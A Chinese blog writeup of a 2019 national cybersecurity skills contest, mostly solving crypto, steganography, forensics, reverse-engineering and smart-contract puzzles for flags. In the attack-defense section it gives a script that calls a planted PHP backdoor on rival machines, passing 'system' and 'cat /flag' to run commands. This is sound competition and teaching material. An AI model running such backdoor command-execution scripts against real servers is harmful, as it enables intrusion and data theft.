# Writeup for 中国技能大赛——全国网络安全管理职业技能竞赛 2019 | Soreat_u's Blog
## [](#初赛)[初赛](#contents:初赛)

初赛在杭州，地点在中国移动杭州研发中心。

![](https://i.loli.net/2020/09/08/gLtlHYoJdCz8NPG.jpg)

![](https://i.loli.net/2020/09/08/IhkWiCROcL86MUX.jpg)

顺便去旁边的杭州师范大学（仓前新校区）逛了下，真羡慕别人的学校：

![](https://i.loli.net/2020/09/08/kh8oSLFYv5lZzCR.jpg)

![](https://i.loli.net/2020/09/08/qLG3ypJY7NZeSEA.jpg)

![](https://i.loli.net/2020/09/08/mYBT2jDUnbGQRVp.jpg)

### [](#crypto)[Crypto](#contents:crypto)

垃圾比赛，才 2 道 Crypto，就值个 30 分。

#### [](#crypto1-10pt)[Crypto1 10pt](#contents:crypto1-10pt)

打开题目描述，看到是一段字符串，直接看到结尾，`c666`，内心甚至毫无波动，。

| \`\`\`
1 2 

````

 | ```
s = 'xxx'
print(bytes.fromhex(s[::-1])) 
````

 |Copy

#### [](#crypto2-20pt)[Crypto2 20pt](#contents:crypto2-20pt)

`RSA.txt`

```
n= 703739435902178622788120837062252491867056043804038443493374414926110815100242619
e= 59159
c= 449590107303744450592771521828486744432324538211104865947743276969382998354463377
m=???

```

`n.bit_length()`看了一下，才 269bit，直接 factor。

可惜没外网，用不了小网站，不过还好有 sage，放后台几分钟就跑出来了。

| \`\`\`
1 2 3 

````

 | ```
factor(703739435902178622788120837062252491867056043804038443493374414926110815100242619)

# 782758164865345954251810941 * 810971978554706690040814093 * 1108609086364627583447802163 
````

 |Copy

`exp.py`

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 

````

 | ```
from Crypto.Util.number import *

n= 703739435902178622788120837062252491867056043804038443493374414926110815100242619
e= 59159
c= 449590107303744450592771521828486744432324538211104865947743276969382998354463377

p = [782758164865345954251810941, 810971978554706690040814093, 1108609086364627583447802163
]
phi = (p[0] - 1) * (p[1] - 1) * (p[2] - 1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
# b'flag{1e257b39a25c6a7c4d66e197}' 
````

 |Copy

抢了 2 个一血，题目太简单了。。

### [](#steg)[Steg](#contents:steg)

#### [](#steg1-xxpt)[Steg1 xxpt](#contents:steg1-xxpt)

拿到一个图片，用`010`打开，能看到`output`里面报错，说`CRC Mismatch @ chunk[0]`，再去看看原图，发现图片的高度是有点不太对。

利用`CRC32`来计算正确的宽度和高度。

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 

````

 | ```
import binascii
import struct

with open('XImg.png', 'rb') as f:
    data = f.read()
    for width in range(2048):
        for height in range(2048):
            guess = data[0xC:0xF+1] + struct.pack('>ii', width, height) + data[0x18:0x1C+1]
            crc = binascii.crc32(guess)
            if crc == 0x53D1578A:
                 print(f"width: {width:#06x}, height: {height:#06x}")

# width: 0x0400, height: 0x0271 
````

 |Copy

修改对应位置的高度，然后保存。

![](https://i.loli.net/2020/04/18/brCfY8d3cagL65z.png)

本以为 flag 就会在图片的下面的，可是并没有。。

试着粗略地看了下图片的`lsb`，没有发现什么有用的信息。

后来队友说，用`Stegsolver`在某个通道里发现了一个二维码。好吧，毕竟垃圾比赛，题目也就只能是这些套路了。

![](https://i.loli.net/2020/04/18/dBRaLNYs7Pwzctl.png)

不能上外网，手机也都上交了，还好之前有了解过一个命令行工具`zbarimg`可以离线解析二维码。把图片保存下来，然后`zbarimg xxx.png`就能得到`flag`。

![](https://i.loli.net/2020/04/18/QLhWcBa3w6JzlyY.png)

#### [](#steg2-xxpt)[steg2 xxpt](#contents:steg2-xxpt)

拿到一个`.exe`文件，没敢运行，直接先`010`看一下，发现是个图片的`base64`。

![](https://i.loli.net/2020/04/18/Nh9ia7RWKHYbpU1.png)

复制进浏览器`url`栏，回车得到一张刘大爷的图片：

再拖进`010`，发现末尾藏了一个压缩包。

复制`hex`数据，新建文件，`Edit As: Hex`，粘贴，保存，得到压缩包。

打开压缩包，发现有密码。试了下伪加密，并不是。

看来要爆破密码，不过这时习惯性地看了下前面那张图片的`details`。

![](https://i.loli.net/2020/04/18/qkEgGzix3Fyf9WN.png)

嗯，都是套路。

password is `QwE12#`，输入解压得到`flag{06e9e74c449042d19e6ee3f6c04fed92}`。

### [](#misc)[Misc](#contents:misc)

#### [](#misc3-15pt)[Misc3 15pt](#contents:misc3-15pt)

拿到一个`.raw`文件，看起来是个取证题，不过没管那么多，还是拖进`010`。

搜索字符串`flag{`，直接看到

![](https://i.loli.net/2020/04/18/kWlYusnFgh2ObES.png)

试着交了下，不对。

`hex`转成`ascii`，提交，正确！

这题目真垃圾。。。

#### [](#misc1-30pt)[Misc1 30pt](#contents:misc1-30pt)

没外网，不太会流量包分析的题目。

(赛后复现)

流量分析题，`wifi`流量，`wep`加密，告诉我们密码是`6666xxxx`。

掩码攻击，上网搜寻了一番，找了一个`linux`环境下的工具`aircrack-ng`。

不太会写掩码爆破 bb 的命令行参数，直接先生成了一个字典，然后字典攻击。

| \`\`\`
1 2 3 

````

 | ```
with open('dic.txt', 'w') as f:
    for i in range(10000):
        f.write(f"6666{i:04d}\n") 
````

 |Copy

![](https://i.loli.net/2020/04/18/aNfIWHlBjxDp43k.png)

![](https://i.loli.net/2020/04/18/hWJEmTavtHYp9cX.png)

![](https://i.loli.net/2020/04/18/vzakW3TfK2QmHxV.png)

所以`flag`应该就是`flag{0566668912-f059-448f}`。

### [](#misc2-30pt)[Misc2 30pt](#contents:misc2-30pt)

(赛后复现)

题目要求从流量包里面找到黑客用的菜刀密码。

参考了下[wireshark 的基本使用及分析流量包的技巧](https://coomrade.github.io/2018/05/04/wireshark/)

里面有讲到：

![](https://i.loli.net/2020/04/18/fR17ovec9AVa4s6.png)

同样试着先`http.request.method == POST`过滤。

![](https://i.loli.net/2020/04/18/u16Vhpoj5cB9avM.png)

按上面那题的思路，菜刀密码应该就是`cmd`，可是这一题跟上面那一题有一个区别就是这边多了一个`strrev`。

比赛的时候，我交过`flag{cmd}`，并不对。

所以`flag`到底是什么？？

…

### [](#reverse)[Reverse](#contents:reverse)

#### [](#re2-30pt)[Re2 30pt](#contents:re2-30pt)

一道迷宫题，输入`key`，走出去就输出`Good!`，走错了就`error!`，_flag_是`key`的 md5 值。 要过两道 check，两道 check 基本上是一样的，唯一的区别就是 check1 要保证 18 步走出去，而 check2 则没有步数限制。

迷宫如下:

```
201111111100000000000000000011111
101111111101111111111011110011111
101111111101111111111011110011111
100000000000000500000100000000011
111111110101111011111111111111111
111100001101111000000000000000000
111100101000000111111111111111112

```

5 是出发点，只能走 0，要走到 2。

```
'w': 上
'.': 下
'0': 左
'm': 右

```

这题就很沙雕，没说必须两次要走不同的出口，导致有多解。

check1 限制了 18 步，那只能左上出去。 14 左 + 3 上 + 1 左：`'0'*14 + 'w'*3 + '0' == '00000000000000www0'`

一开始，我觉得 check2 直接按照 check1 的走法完全没问题。 也就是：`00000000000000www000000000000000www0`

![](https://i.loli.net/2020/04/18/dEo4VvgNPkfp1K6.png)

交_flag_，显示不对。。

找来主办方，主办方说这题是有点坑，然后又提示我后半部分有问题。

嗯，那看来 check2 只能从右下出去了。 2 下 + 17 右 + 1 下： `'.'*2 + 'm'*17 + '.' == ..mmmmmmmmmmmmmmmmm.`

那么`key = 00000000000000www0..mmmmmmmmmmmmmmmmm.`

![](https://i.loli.net/2020/04/18/gb4BkufFhxmelv1.png)

转成 md5

| \`\`\`
1 2 3 4 5 

````

 | ```
import hashlib

print(hashlib.md5(b'00000000000000www0..mmmmmmmmmmmmmmmmm.').hexdigest())

# flag{d8ec55f877596b311117434cfc9e0cff} 
````

 |Copy

交了`flag`，终于对了。。又拿了个一血，不过并没有什么加成。。

#### [](#re1-30pt)[Re1 30pt](#contents:re1-30pt)

先要脱个 upx 的壳。

没怎么打过逆向，不会脱壳，又没外网，现场学都学不了。。 tcl…

(赛后复现)

upx 壳，原理先暂时缓一缓，找个工具脱了再说。

上网搜寻了一波，找到了一个`UPX Easy GUI`，直接脱。

脱完就很简单了。

* * *

输入长度不超过 27，过一个 check。

input 经过一通替换后变为`tfoQ5ckkwhX51HYpxAjkMQYTAp5`。

1.  diff = input\[i] - key\[i]
2.  output\[i] = table\[diff % 4]\[diff]

大致流程可以看\[源代码]。([https://www.cnblogs.com/QKSword/p/9095242.html](https://www.cnblogs.com/QKSword/p/9095242.html))

`exp.py`

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 

````

 | ```
table = [
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    "+/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/",
    "0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
]
key = "QASWZXDECVFRBNGTHYJUMKIOLP"
output = "tfoQ5ckkwhX51HYpxAjkMQYTAp5"

for k, out in enumerate(output):
    for i in range(4):
        index = table[i].index(out)
        if index % 4 == i:
            add = ord(key[k]) + index
            if 33 <= add <=126:
                print(chr(add), end='')
    print() 
````

 |Copy

![](https://i.loli.net/2020/04/18/uwFIRNdPJxlarzs.png)

md，又是一道多解。

`flag{this_is_a_easy_suanfa}`

### [](#pwn)[PWN](#contents:pwn)

三道堆题，dnm

### [](#web)[Web](#contents:web)

队友说三道题全都是第五空间的原题。。

垃圾比赛。

### [](#下午awd)[下午 AWD](#contents:下午awd)

完全不会。。

手动尝试用初始密码登录别的靶机，找到了 3 台。。迅速改了密码。

然后每回合手动交 flag。。

### [](#summary)[Summary](#contents:summary)

Web 相关的等有时间要去学一手了。

AWD 也要好好搞一下了。

## [](#决赛)[决赛](#contents:决赛)

决赛在西安锦江国际酒店，五星级。

不怎么会拍照：

![](https://i.loli.net/2020/09/08/JY9HvBOPsKkM8zX.jpg)

![](https://i.loli.net/2020/09/08/ZWyV745YsF3idPo.jpg)

![](https://i.loli.net/2020/09/08/iAKo58lUuNDpJbt.jpg)

![](https://i.loli.net/2020/09/08/15rRJIfNyolse8A.jpg)

### [](#introduction)[Introduction](#contents:introduction)

全程断网比赛，还好电脑里存了很多东西，现场自学。。。

### [](#第一天早上个人赛)[第一天早上个人赛](#contents:第一天早上个人赛)

本来是第一的，而且跟第二分差拉的挺大的。奈何比赛时间有点长，到了后面，下面的人都赶上来了。。

#### [](#industrial_01)[Industrial_01](#contents:industrial_01)

用`wireshark`打开流量包，`ip.dst == 10.1.1.49`过滤流量包。

右键 -> 追踪 TCP 流 -> 发现`00411000002018008008`为 PLC 的序列号。

`hashlib.md5(b'00411000002018008008').hexdigest()`获得 flag。

flag{57ab8a9c2f5962abf9d27a26343e04af}

#### [](#crackme01)[crackme01](#contents:crackme01)

IDA 打开

F5 反编译，发现几个`if`后，会输出正确的 flag。

encryptCTF{gdb_or_r2?}

#### [](#二维码签到)[二维码签到](#contents:二维码签到)

linux 下，`zbarimg qr.png`获得 flag。

flag{have_a_good_luck}

#### [](#简单的rsa)[简单的 RSA](#contents:简单的rsa)

sagemath 直接分解 n

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 

````

 | ```
n = 0xe708251f8e8b616121419de1369f44b4a92f9641b8270ae6c50cef2bb6548de7633176399640a553cc764ab02decfd4cbe45
# factor(n)
# n = 1235542029039790988583258906019 * 1235542029039790988583258906103 * 1235542029039790988583258906107 * 1235542029039790988583258906163
ps = [
 1235542029039790988583258906019,
 1235542029039790988583258906103,
 1235542029039790988583258906107,
 1235542029039790988583258906163
]

phi = 1
for p in ps:
    phi *= (p-1)

c=0x58bd0290b41e567e9839a9cc70295107bb44a9e6a9b36ee2d36e19b01bf55083823b8983e02a8ea5b94facb221797babf72b
e=0x10001

d = inverse_mod(e, phi)
m = pow(c, d, n)
print m
# 13040004482819733629700969318967011475581959936432563287438093969804777918126467048875308157

# In [55]: long_to_bytes(pow(c,d,n))
# Out[55]: b'flag{2a0efd7734a07c6c430cfd04dfccdd94}' 
````

 |Copy

#### [](#memory)[memory](#contents:memory)

| \`\`\`
1 2 

````

 | ```
$ volatility -f 8.raw imageinfo
Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) 
````

 |Copy

指定系统类型并查看进程表

| \`\`\`
1 2 

````

 | ```
$ volatility -f 8.raw --profile WinXPSP2x86 pslist
0x81ca5a20 notepad.exe            3000    924      1       44      0      0 2018-11-19 06:50:46 UTC+0000 
````

 |Copy

发现有一个 notepad 进程

| \`\`\`
1 2 

````

 | ```
$ volatility -f 8.raw --profile WinXPSP2x86 notepad
flag{3661386562366162333565313332396130373363313239656230356332636566} 
````

 |Copy

#### [](#小明的键盘)[小明的键盘](#contents:小明的键盘)

键盘流量包分析

`tshark -r usb.pcapng -T fields -e usb.capdata`导出键位信息

```
0000090000000000
0000000000000000
00000f0000000000
0000000000000000
0000040000000000
0000000000000000
00000a0000000000
0000000000000000
0200000000000000
02002f0000000000
0200000000000000
0000000000000000
0000220000000000
0000000000000000
0000060000000000
0000000000000000
0000220000000000
0000000000000000
00001f0000000000
0000000000000000
0000040000000000
0000000000000000
0000070000000000
0000000000000000
0000060000000000
0000000000000000
0000070000000000
0000000000000000
00001f0000000000
0000000000000000
0000050000000000
0000000000000000
0000060000000000
0000000000000000
0000060000000000
0000000000000000
0000270000000000
0000000000000000
0000270000000000
0000000000000000
0000270000000000
0000000000000000
0000040000000000
0000000000000000
0000250000000000
0000000000000000
0000050000000000
0000000000000000
0000210000000000
0000000000000000
0000050000000000
0000000000000000
0000070000000000
0000000000000000
0000220000000000
0000000000000000
0000080000000000
0000000000000000
0000050000000000
0000000000000000
0000200000000000
0000000000000000
0000230000000000
0000000000000000
0000050000000000
0000000000000000
0000250000000000
0000000000000000
0000210000000000
0000000000000000
0000060000000000
0000000000000000
0000070000000000
0000000000000000
0000080000000000
0000000000000000
0200000000000000
0200300000000000
0200000000000000
0000000000000000

```

根据电脑里存了的`Universal Serial Bus(USB) manual.pdf`里，关于 Keyboard 的对照表，转成对应的字符。

flag{5c52adcd2bcc000a8b4bd5eb36b84cde}

#### [](#vcsa)[VCSA](#contents:vcsa)

文件内容实际上一个 base64 编码的图片，复制进浏览器 url 栏，回车，拿到图片。

是一个`jpg`文件，图片元数据里有`QwE12#`。

用`010 Editor`打开，发现末尾有一个压缩包。

修改后缀为`.zip`，打开，需要密码，输入`QwE12#`正确，解压得到 flag。

flag{06e9e74c449042d19e6ee3f6c04fed92}

#### [](#五彩斑斓的二维码)[五彩斑斓的二维码](#contents:五彩斑斓的二维码)

将彩色像素值转成白色或者黑色

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 

````

 | ```
from PIL import Image
from itertools import combinations

img = Image.open('qr_code.bmp')

w, h = img.size
data = img.load()

white = (255, 255, 255)
black = (0, 0, 0)

colors = [(0, 0, 255), (255, 0, 0), (0, 255, 0),
          (255, 255, 0), (0, 255, 255), (255, 0, 255)]

for i in range(64):
    new_img = Image.new(img.mode, img.size)
    new = new_img.load()

    b_i = bin(i)[2:].zfill(6)
    mappings = {}
    for k, b in enumerate(b_i):
        if b == '1':
            mappings[colors[k]] = white
        else:
            mappings[colors[k]] = black

    for x in range(w):
        for y in range(h):
            pixel = data[x, y]
            if pixel == white or pixel == black:
                new[x, y] = pixel
            else:
                new[x, y] = mappings[pixel]
    new_img.save(f'{i}.png')

img.close() 
````

 |Copy

得到 64 张二维码。

`zbarimg *.png`获得 3 段 flag

```
QR-Code:flag{5bfc2c45
QR-Code:6d10a8b830a6f
QR-Code:ed7cfdf08f3}

```

flag{5bfc2c456d10a8b830a6fed7cfdf08f3}

### [](#第一天下午团队赛)[第一天下午团队赛](#contents:第一天下午团队赛)

#### [](#3号机)[3 号机](#contents:3号机)

在`Lib\Config\Controllers.php`下发现有后门

![](https://i.loli.net/2020/09/08/W2HB8tJPTSkCexL.png)

构造`payload`，写脚本全场打：

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 

````

 | ```
import requests
import os

# Token = 'CHyEnYnN8d3MwMH68NAYq2GRVcWYZjedlz5zMrfDd5kQv'
# url = 'http://10.66.40.200/api/v1/att_def/web/submit_flag/?event_id=5'
prefix = 'http://172.34.'
suffix = '.103/Lib/Config/Controllers.php?b2=cat%20/flag&b1=system'

for i in range(1, 12):
    try:
        url = prefix + str(i) + suffix
        # print(url)
        html = requests.get(url)
        # print(html.text)

        if 'warning' not in html.text:
            print(html.text.split('\n')[-2])
            print(i)
    except:
        continue 
````

 |Copy

打到后面，就只有 1-2 台能打了。。

#### [](#2号机)[2 号机](#contents:2号机)

没审出洞，还一直被打，修不了。

到比赛结束前半个小时，才发现原来主办方提供了每一轮的流量。。。。

然后开始修洞，到比赛结束都还没修好。。

#### [](#1号机)[1 号机](#contents:1号机)

2web+1crypto，没办法，只能我来看看 pwn 了

程序挺啰嗦的。

逆到一个退出的逻辑：

![](https://i.loli.net/2020/09/08/cNUDAoxHgJqi4hQ.png)

存在缓冲区溢出。

把`read(0, &buf, 0x70uLL)`patch 成`read(0, &buf, 0x50uLL)`：

![](https://i.loli.net/2020/09/08/aOQdJGNzDE8Tnwg.png)

顺手还 patch 了一些别的不太安全的地方。

`scp`上传至 1 号机，成功防住！

#### [](#tldr)[TL;DR](#contents:tldr)

防住了 1 号机和 3 号机，3 号机还能每轮交几个 flag。最后排名`5/12`，tcl。。。

### [](#第二天上午精英个人赛)[第二天上午精英个人赛](#contents:第二天上午精英个人赛)

第一天个人赛拿了个第四。。前 5 能进这个精英个人赛。

一拿到题，6 道题，感觉没有一个能出。

每个题都看了遍，发现就`智能合约`那题可以做一下。

#### [](#智能合约)[智能合约](#contents:智能合约)

```
请根据合约及其交互信息找出其中隐藏的信息。

Bytecode：
0x60806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806304618359146100725780631cbeae5e1461009f578063890eba68146100cc578063a2da82ab146100f7578063f0fdf83414610127575b600080fd5b34801561007e57600080fd5b5061009d60048036038101908080359060200190929190505050610154565b005b3480156100ab57600080fd5b506100ca6004803603810190808035906020019092919050505061015e565b005b3480156100d857600080fd5b506100e1610171565b6040518082815260200191505060405180910390f35b34801561010357600080fd5b50610125600480360381019080803560ff169060200190929190505050610177565b005b34801561013357600080fd5b50610152600480360381019080803590602001909291905050506101bb565b005b8060008190555050565b6000548114151561016e57600080fd5b50565b60005481565b60008060009150600090505b60108110156101ab576008829060020a0291508260ff16821891508080600101915050610183565b8160005418600081905550505050565b8060036000540201600081905550505600a165627a7a7230582012c9c1368a7902a818e339b8db79b7130db8795bd2a793898b509dc020d960d20029

Opcode:
PUSH1 0x80
PUSH1 0x40
MSTORE
PUSH1 0x04
CALLDATASIZE
LT
PUSH2 0x006d
JUMPI
PUSH1 0x00
CALLDATALOAD
PUSH29 0x0100000000000000000000000000000000000000000000000000000000
SWAP1
DIV
PUSH4 0xffffffff
AND
DUP1
PUSH4 0x04618359
EQ
PUSH2 0x0072
JUMPI
DUP1
PUSH4 0x1cbeae5e
EQ
PUSH2 0x009f
JUMPI
DUP1
PUSH4 0x890eba68
EQ
PUSH2 0x00cc
JUMPI
DUP1
PUSH4 0xa2da82ab
EQ
PUSH2 0x00f7
JUMPI
DUP1
PUSH4 0xf0fdf834
EQ
PUSH2 0x0127
JUMPI
JUMPDEST
PUSH1 0x00
DUP1
REVERT
JUMPDEST
CALLVALUE
DUP1
ISZERO
PUSH2 0x007e
JUMPI
PUSH1 0x00
DUP1
REVERT
JUMPDEST
POP
PUSH2 0x009d
PUSH1 0x04
DUP1
CALLDATASIZE
SUB
DUP2
ADD
SWAP1
DUP1
DUP1
CALLDATALOAD
SWAP1
PUSH1 0x20
ADD
SWAP1
SWAP3
SWAP2
SWAP1
POP
POP
POP
PUSH2 0x0154
JUMP
JUMPDEST
STOP
JUMPDEST
CALLVALUE
DUP1
ISZERO
PUSH2 0x00ab
JUMPI
PUSH1 0x00
DUP1
REVERT
JUMPDEST
POP
PUSH2 0x00ca
PUSH1 0x04
DUP1
CALLDATASIZE
SUB
DUP2
ADD
SWAP1
DUP1
DUP1
CALLDATALOAD
SWAP1
PUSH1 0x20
ADD
SWAP1
SWAP3
SWAP2
SWAP1
POP
POP
POP
PUSH2 0x015e
JUMP
JUMPDEST
STOP
JUMPDEST
CALLVALUE
DUP1
ISZERO
PUSH2 0x00d8
JUMPI
PUSH1 0x00
DUP1
REVERT
JUMPDEST
POP
PUSH2 0x00e1
PUSH2 0x0171
JUMP
JUMPDEST
PUSH1 0x40
MLOAD
DUP1
DUP3
DUP2
MSTORE
PUSH1 0x20
ADD
SWAP2
POP
POP
PUSH1 0x40
MLOAD
DUP1
SWAP2
SUB
SWAP1
RETURN
JUMPDEST
CALLVALUE
DUP1
ISZERO
PUSH2 0x0103
JUMPI
PUSH1 0x00
DUP1
REVERT
JUMPDEST
POP
PUSH2 0x0125
PUSH1 0x04
DUP1
CALLDATASIZE
SUB
DUP2
ADD
SWAP1
DUP1
DUP1
CALLDATALOAD
PUSH1 0xff
AND
SWAP1
PUSH1 0x20
ADD
SWAP1
SWAP3
SWAP2
SWAP1
POP
POP
POP
PUSH2 0x0177
JUMP
JUMPDEST
STOP
JUMPDEST
CALLVALUE
DUP1
ISZERO
PUSH2 0x0133
JUMPI
PUSH1 0x00
DUP1
REVERT
JUMPDEST
POP
PUSH2 0x0152
PUSH1 0x04
DUP1
CALLDATASIZE
SUB
DUP2
ADD
SWAP1
DUP1
DUP1
CALLDATALOAD
SWAP1
PUSH1 0x20
ADD
SWAP1
SWAP3
SWAP2
SWAP1
POP
POP
POP
PUSH2 0x01bb
JUMP
JUMPDEST
STOP
JUMPDEST
DUP1
PUSH1 0x00
DUP2
SWAP1
SSTORE
POP
POP
JUMP
JUMPDEST
PUSH1 0x00
SLOAD
DUP2
EQ
ISZERO
ISZERO
PUSH2 0x016e
JUMPI
PUSH1 0x00
DUP1
REVERT
JUMPDEST
POP
JUMP
JUMPDEST
PUSH1 0x00
SLOAD
DUP2
JUMP
JUMPDEST
PUSH1 0x00
DUP1
PUSH1 0x00
SWAP2
POP
PUSH1 0x00
SWAP1
POP
JUMPDEST
PUSH1 0x10
DUP2
LT
ISZERO
PUSH2 0x01ab
JUMPI
PUSH1 0x08
DUP3
SWAP1
PUSH1 0x02
EXP
MUL
SWAP2
POP
DUP3
PUSH1 0xff
AND
DUP3
XOR
SWAP2
POP
DUP1
DUP1
PUSH1 0x01
ADD
SWAP2
POP
POP
PUSH2 0x0183
JUMP
JUMPDEST
DUP2
PUSH1 0x00
SLOAD
XOR
PUSH1 0x00
DUP2
SWAP1
SSTORE
POP
POP
POP
POP
JUMP
JUMPDEST
DUP1
PUSH1 0x03
PUSH1 0x00
SLOAD
MUL
ADD
PUSH1 0x00
DUP2
SWAP1
SSTORE
POP
POP
JUMP
STOP

部分和合约的交互记录

log1:
0xa2da82ab0000000000000000000000000000000000000000000000000000000000000009

log2:
0xf0fdf83400000000000000000000000000000000000000000000000000000000deadbeaf

log3:
0xa2da82ab0000000000000000000000000000000000000000000000000000000000000007

log4:
secret.flag
{
    "0": "uint256: 36269314025157789027829875601337027084"
}

```

没外网，不然在线反编译网站一搞，直接得到伪代码，比看这个字节码舒服多了。

还好之前去打数字经济，逆过伪代码的智能合约，大致了解这个合约代码的一个结构。而且也稍微接触过汇编代码，有一定的理解。

最巧的是，之前有 download 过`Solidity`的官方文档；而且之前也扫过一遍这个文档，有印象在这个文档里面是有`Solidity`的底层字节码相关的东西的。

在电脑里，找到了文档：

![](https://i.loli.net/2020/09/08/rgDQBeqoXY8jsIP.png)

在文档里，找到了字节码所在的位置：

![](https://i.loli.net/2020/09/08/qX78fkS56VGd1Zc.png)

它居然说，

```
This document does not want to be a full description of the Ethereum virtual machine, but the following list can be used as a reference of its opcodes.

```

虽然没给出全面的描述，但还是给出了一些指令的含义，以及`KVM`的底层实现。

![](https://i.loli.net/2020/09/08/XcQ1fzWBHd95UqP.png)

就一个**栈**结构，很简单。

* * *

![](https://i.loli.net/2020/09/08/I6c2CMv51GPBi9R.png)

先观察了一下每次交互的记录，根据上次数字经济的经验，前面`0xa2da82ab`应该就是合约里面的函数所对应的一个 Hash 值，而末尾的`00000009`就应该是传入这个函数的参数。

所以这个交互记录就是：

call 了`0xa2da82ad`这个函数两次，参数分别是 9 和 7。

call 了`0xf0fdf834`这个函数一次，参数是`0xdeadbeaf`。

所以只要搞清楚这两个函数干了什么就可以了。

* * *

开逆！

随便逆了一会，完全分不清这个里面的`JUMP`到底跳到哪里去了。

然后发现有一个`JUMPDEST`，猜测就是\`JUMP 的目的地。

搜了一下一共有 24 个`JUMP`和`JUMPI`，对应的也正好有 24 个`JUMPDEST`。

![](https://i.loli.net/2020/09/08/QH31ceyYfDkCz8F.png)

每次 jump 之前都会有一个`PUSH2 0x????`操作，翻了下文档，发现这就是`jump`的目的地。

但是`0x????`没有在代码里面标识啊！

又发现`0x????`里面没有重复的，而且有一个大小关系。

猜测，如果把这些`0x????`按大小排序，对应的应该就是从上往下的`JUMPDEST`的位置。

用 python 写了个脚本，并手动在每个`JUMPDEST`前标上当前的地址。

![](https://i.loli.net/2020/09/08/dYiNxI5uVGKtOqT.png)

* * *

根据数字经济的经验，合约代码的开头是一个跳转表。

![](https://i.loli.net/2020/09/08/IqXafQFdWYG362P.png)

先搞这个`0xa2da82ab`，对应的开始位置应该是`0x00f7`。

![](https://i.loli.net/2020/09/08/KG2hbgojMaRtOeF.png)

再找到`0x177`处的逻辑：

![](https://i.loli.net/2020/09/08/okTGAg1H4JN3ZMn.png)

就是一个 16 轮操作。

最后跳到`0x01ab`这里，对`storage[0]`**异或**上对参数进行 16 轮操作后的值。

* * *

再来看看`0xf0fdf834`：

![](https://i.loli.net/2020/09/08/uZ2l9cnzyJt34S1.png)

函数开头位置在`0x0127`。

![](https://i.loli.net/2020/09/08/kzq7n3NbYWf8dHS.png)

然后再跳转到`0x01bb`，

![](https://i.loli.net/2020/09/08/lH5sB2fGgFYnZ76.png)

把`storage[0]`乘 3，再加上`0xdeadbeaf`。

实际上比赛结束前半个小时我才刚块逆完。

主办方看没人做出来，直接扔出了已经反汇编好的伪代码：

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 

````

 | ```
#   def storage:   flag is uint256 at storage 0
def flag(): # not payable   return flag

# #  Regular functions
#   def _fallback() payable: # default function   revert

def unknown04618359(uint256 _param1): # not payable   flag = _param1

def winner(uint256 _param1): # not payable   require _param1 == flag

def unknownf0fdf834(uint256 _param1): # not payable   flag = (3 * flag) + _param1

def unknowna2da82ab(uint8 _param1): # not payable
idx = 0
s = 0
while idx < 16:
    idx = idx + 1
    s = 256 * s xor _param1
    continue

flag = flag xor 0 
````

 |Copy

这下就很简单了。

先逆`log3`：`storage[0]`处直接异或`0xa2da82ad(7)`;

再逆`log2`：`(storage[0] - 0xdeadbeaf) - 3`;

最后逆`log1`：`storage[0]`处异或`0xa2da82ad(9)`。

得到的就是初始的`storage[0]`，也就是 flag。

python 脚本如下：

| \`\`\`
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 

````

 | ```
 from Crypto.Util.number import long_to_bytes
def f(x):
    idx = 0
    s = 0
    while idx < 16:
        idx += 1
        s = 256*s ^ x
    return s

stg = 36269314025157789027829875601337027084

stg ^= f(7)
stg = (stg - 0xdeadbeaf) // 3
stg ^= f(9)

print(long_to_bytes(stg))
# b'flag{hello_ctf}' 
````

 |Copy

拿了全场唯一的一血：

![](https://i.loli.net/2020/09/08/VzoyugaU1RGTqvJ.png)

### [](#颁奖)[颁奖](#contents:颁奖)

因为还要去赶着去湖湘杯，所以打完就溜了，没等到颁奖典礼。

最后拿了团队二等奖 + 个人赛二等奖 + 精英赛个人赛二等奖 + 新锐奖，以及 5k 奖金。 
 [https://blog.soreatu.com/posts/writeup-for-jinengdasai-final-2019/](https://blog.soreatu.com/posts/writeup-for-jinengdasai-final-2019/)
